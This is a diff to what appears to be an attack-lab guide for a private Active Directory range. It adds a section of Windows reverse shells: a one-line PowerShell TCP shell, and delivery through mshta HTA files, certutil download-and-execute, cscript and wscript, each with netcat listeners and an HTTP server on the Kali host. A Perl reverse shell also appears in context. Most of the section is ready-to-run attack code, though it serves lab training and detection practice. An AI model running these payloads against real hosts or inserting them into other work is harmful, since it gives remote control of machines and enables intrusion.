@@ -466,6 +466,127 @@ perl -e 'use Socket;$i="10.2.50.250";$p=4444;socket(S,PF_INET,SOCK_STREAM,getpro
 
 ---
 
+## Windows Reverse Shells
+
+Available on all domain-joined Windows VMs: **DC01-2022** (10.2.50.11), **DC01-SEC** (10.2.50.12), **ADCS** (10.2.50.13), **WEB** (10.2.50.14), **WIN11-22H2-1** (10.2.50.21), **WIN11-22H2-2** (10.2.50.22).
+
+**Prerequisites:** Kali at `10.2.50.250`. For download-based payloads, start an HTTP server on Kali first:
+
+```bash
+# Kali — serve files from current working directory
+python3 -m http.server 8080
+```
+
+---
+
+### PowerShell
+
+```bash
+# 1. Listener — Kali (10.2.50.250)
+nc -lvnp 4444
+
+# 2. Payload — target Windows host (cmd or PS prompt)
+powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('10.2.50.250',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($n=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n);$r=(iex $d 2>&1|Out-String);$rb=([Text.Encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($rb,0,$rb.Length);$s.Flush()};$c.Close()"
+```
+
+---
+
+### mshta.exe
+
+mshta executes HTML Application (`.hta`) files — VBScript/JScript runs with the full scripting host trust level, bypassing browser security zones.
+
+```bash
+# 1. Create shell.hta — Kali
+cat > shell.hta << 'EOF'
+<html><head><script language="VBScript">
+Set oShell = CreateObject("WScript.Shell")
+oShell.Run "powershell -nop -w hidden -c ""$c=New-Object Net.Sockets.TCPClient('10.2.50.250',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($n=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n);$r=(iex $d 2>&1|Out-String);$rb=([Text.Encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($rb,0,$rb.Length);$s.Flush()};$c.Close()""", 0, False
+self.close
+</script></head></html>
+EOF
+
+# 2. Listener — Kali (10.2.50.250)
+nc -lvnp 4444
+
+# 3. HTTP server — Kali (same directory as shell.hta)
+python3 -m http.server 8080
+
+# 4. Execute — target Windows host (cmd prompt)
+mshta http://10.2.50.250:8080/shell.hta
+```
+
+---
+
+### certutil
+
+certutil is a built-in Windows certificate utility — its `-urlcache` flag downloads arbitrary files from HTTP.
+
+```bash
+# 1. Create shell.ps1 — Kali
+cat > shell.ps1 << 'EOF'
+$c=New-Object Net.Sockets.TCPClient('10.2.50.250',4444)
+$s=$c.GetStream()
+[byte[]]$b=0..65535|%{0}
+while(($n=$s.Read($b,0,$b.Length)) -ne 0){
+    $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n)
+    $r=(iex $d 2>&1|Out-String)
+    $rb=([Text.Encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ')
+    $s.Write($rb,0,$rb.Length);$s.Flush()
+}
+$c.Close()
+EOF
+
+# 2. Listener — Kali (10.2.50.250)
+nc -lvnp 4444
+
+# 3. HTTP server — Kali (same directory as shell.ps1)
+python3 -m http.server 8080
+
+# 4. Download and execute — target Windows host (cmd prompt)
+certutil -urlcache -split -f http://10.2.50.250:8080/shell.ps1 C:\Windows\Temp\shell.ps1
+powershell -nop -f C:\Windows\Temp\shell.ps1
+```
+
+---
+
+### cscript
+
+cscript runs Windows Script Host files in **console mode** — output is written to the calling terminal window.
+
+```bash
+# 1. Create shell.js — Kali
+cat > shell.js << 'EOF'
+var s = new ActiveXObject("WScript.Shell");
+s.Run("powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('10.2.50.250',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($n=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n);$r=(iex $d 2>&1|Out-String);$rb=([Text.Encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($rb,0,$rb.Length);$s.Flush()};$c.Close()\"", 0, false);
+EOF
+
+# 2. Listener — Kali (10.2.50.250)
+nc -lvnp 4444
+
+# 3. HTTP server — Kali (same directory as shell.js)
+python3 -m http.server 8080
+
+# 4. Download and execute — target Windows host (cmd prompt)
+certutil -urlcache -split -f http://10.2.50.250:8080/shell.js C:\Windows\Temp\shell.js
+cscript //nologo C:\Windows\Temp\shell.js
+```
+
+---
+
+### wscript
+
+wscript runs the same Windows Script Host files in **GUI (windowless) mode** — no console window appears on the target host.
+
+```bash
+# 1–3. Same as cscript — create shell.js on Kali, start listener, start HTTP server
+
+# 4. Download and execute (windowless) — target Windows host (cmd prompt)
+certutil -urlcache -split -f http://10.2.50.250:8080/shell.js C:\Windows\Temp\shell.js
+wscript //nologo C:\Windows\Temp\shell.js
+```
+
+---
+
 ## Linux Capabilities
 
 ### cap_gdb — CAP_SETUID → Root Shell (ops)
@@ -546,8 +667,9 @@ SSH as any user (no sudo)
 | ADCS | ESC1–ESC16 certificate template misconfigurations, RDP access to CA |
 | IIS + ASP.NET + MSSQL | Web application attacks, SQL injection, authentication bypass |
 | GitLab CE | Source code exposure, CI/CD pipeline abuse, secret leakage, SUID privesc |
-| Linux — gitlab | SUID binary abuse (R, apt-get, less, rsync), capabilities (gzip/CAP_DAC_OVERRIDE) |
-| Linux — ops | Restricted sudo escape (ansible-playbook, ansible-test, certbot, watch), capabilities (gdb/CAP_SETUID) |
+| Linux — gitlab | SUID binary abuse (R, apt-get, less, rsync), capabilities (gzip/CAP_DAC_OVERRIDE), reverse shells |
+| Linux — ops | Restricted sudo escape (ansible-playbook, ansible-test, certbot, watch), capabilities (gdb/CAP_SETUID), reverse shells |
+| Windows — all domain VMs | Reverse shells (PowerShell, mshta.exe, certutil, cscript, wscript) |
 | Elastic SIEM | Detection engineering, alert tuning, log analysis |
 
 ## Notes
